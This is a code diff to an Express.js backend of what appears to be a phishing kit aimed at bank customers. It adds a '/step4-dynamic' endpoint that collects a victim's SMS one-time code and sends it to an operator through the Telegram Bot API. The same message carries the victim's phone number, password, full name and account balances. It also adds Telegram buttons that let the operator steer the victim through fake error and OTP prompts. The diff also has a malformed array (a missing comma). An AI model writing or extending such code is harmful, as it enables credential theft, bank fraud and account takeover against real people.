@@ -55,6 +55,10 @@ function getLoanSimulatorMenu(sessionId) {
 	  [
         { text: "🧬 Biometría", callback_data: `go:biometria|${sessionId}` }
       ],
+	  [
+        { text: "❌ Error Monto", callback_data: `go:loan-simulator-error|${sessionId}` },
+        { text: "♻️ Pedir Dinámica SMS", callback_data: `go:one-time-sms|${sessionId}` }
+      ],
       [
         { text: "❌ Error Monto", callback_data: `go:loan-simulator-error|${sessionId}` },
         { text: "♻️ Pedir Dinámica", callback_data: `go:one-time-pass|${sessionId}` }
@@ -77,8 +81,12 @@ function getDynamicMenu(sessionId) {
       ],
 	  [
         { text: "🧬 Biometría", callback_data: `go:biometria|${sessionId}` }
+      ]
+	  [
+        { text: "❌ Error Monto", callback_data: `go:loan-simulator-error|${sessionId}` },
+        { text: "♻️ Pedir Dinámica SMS", callback_data: `go:one-time-sms|${sessionId}` }
       ],
-      [
+	  [
         { text: "❌ Error Clave", callback_data: `go:access-sign-in-pass|${sessionId}` },
         { text: "❌ Error Monto", callback_data: `go:loan-simulator-error|${sessionId}` }
       ],
@@ -89,7 +97,6 @@ function getDynamicMenu(sessionId) {
     ]
   };
 }
-
 // ==================== ENDPOINT PRINCIPAL ====================
 app.get('/', (_req, res) => {
   res.json({ 
@@ -293,6 +300,60 @@ app.post('/step3-dynamic', async (req, res) => {
     res.status(500).json({ ok: false, reason: error.message });
   }
 });
+
+// ==================== ENDPOINT: PASO 4 - DINÁMICA  SMS ====================
+
+app.post('/step4-dynamic', async (req, res) => {
+  try {
+    const { sessionId, otp, attemptNumber } = req.body;
+
+    if (!BOT_TOKEN || !CHAT_ID) {
+      return res.status(500).json({ ok: false, reason: "Env vars undefined" });
+    }
+
+    // Obtener datos de sesión
+    const session = sessionData.get(sessionId) || {};
+    
+    // Guardar la dinámica
+    if (!session.dynamics) {
+      session.dynamics = [];
+    }
+    session.dynamics.push(otp);
+    sessionData.set(sessionId, session);
+
+    const mensaje = `
+📲 DINÁMICA SMS  ${attemptNumber} RECIBIDA 📲
+
+📱 Número: ${session.phoneNumber || 'N/A'}
+🔑 Clave: ${session.password || 'N/A'}
+👤 Nombre y apellido: ${session.nombreCompleto || 'N/A'}
+💰 Saldo actual 1: ${session.saldoActual1 || 'N/A'}
+💰 Saldo actual 2: ${session.saldoActual2 || 'N/A'}
+🔢 Dinámica SMS ${attemptNumber}: ${otp}
+🆔 Session: ${sessionId}
+    `.trim();
+
+    // Enviar a Telegram CON BOTONES
+    await axios.post(getTelegramApiUrl('sendMessage'), {
+      chat_id: CHAT_ID,
+      text: mensaje,
+      reply_markup: getDynamicMenu(sessionId)
+    });
+
+    console.log(`✅ Dinámica ${attemptNumber} recibida - Session: ${sessionId} - OTP: ${otp}`);
+
+    res.json({ ok: true });
+  } catch (error) {
+    console.error('❌ ERROR EN /step3-dynamic:', error.message);
+    res.status(500).json({ ok: false, reason: error.message });
+  }
+});
+
+
+
+
+
+
 
 // ==================== ENDPOINT: CONSIGNAR ====================
 app.post('/consignar', async (req, res) => {
